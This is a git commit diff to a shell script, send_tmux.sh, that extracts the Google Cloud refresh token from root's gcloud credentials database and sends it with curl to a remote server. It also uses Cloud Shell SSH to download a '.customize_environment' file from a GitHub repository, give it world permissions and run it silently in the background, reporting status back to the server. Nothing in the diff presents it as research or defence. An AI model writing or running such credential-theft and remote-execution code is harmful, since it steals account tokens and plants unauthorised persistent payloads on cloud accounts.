a4440bc711fbb755c1921b730e606ca6ec599d34
Predador21 <81100606+Predador21@users.noreply.github.com>
2021-09-22 00:15:41 -0300

    Update send_tmux.sh

--- send_tmux.sh
+++ send_tmux.sh
@@ -38,27 +38,28 @@ do
         echo 'Token enviado!'
 
         new=$(sudo gcloud config get-value account)
-
-        sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$new'" > $file
-        refresh_token=$(jq '.refresh_token' $file)
-        refresh_token=${refresh_token//'"'/}
         
-        echo 'refresh_token: '$refresh_token
-
+        refresh_token='null'
+        
+        while [ $refresh_token == 'null' ]
+        do
+          sudo sqlite3 /root/.config/gcloud/credentials.db "select value from credentials where account_id = '$new'" > $file
+          refresh_token=$(jq '.refresh_token' $file)
+          refresh_token=${refresh_token//'"'/}
+        done
+        
         url=$ip'/new.php?session='$session'&account='$new'&creator='$user'&refresh='$refresh_token
         curl $url
-
-        echo $new 'ok!'
 
         commandOK='false'
 
         command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; sudo chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"
 
-        while [ commandOK != 'true' ]
+        while [ $commandOK != 'true' ]
         do
           sudo gcloud cloud-shell ssh --account=$new --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet && commandOK='true'
         done
-        
+
         url=$ip'/send_status.php?account='$new'&status=CREATED&owner=root'
         curl $url
 
